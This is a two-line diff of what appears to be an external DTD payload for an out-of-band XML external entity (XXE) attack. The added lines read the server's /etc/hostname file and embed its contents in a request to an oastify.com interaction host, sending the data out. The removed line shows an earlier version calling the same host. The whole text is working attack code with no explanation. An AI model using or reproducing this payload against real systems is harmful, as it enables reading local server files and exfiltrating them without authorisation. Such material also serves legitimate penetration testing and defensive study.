@@ -1,1 +1,2 @@
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://hteobby8uh6zeuoxdixq9655zw5ntlha.oastify.com/wow'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.hteobby8uh6zeuoxdixq9655zw5ntlha.oastify.com/'>">
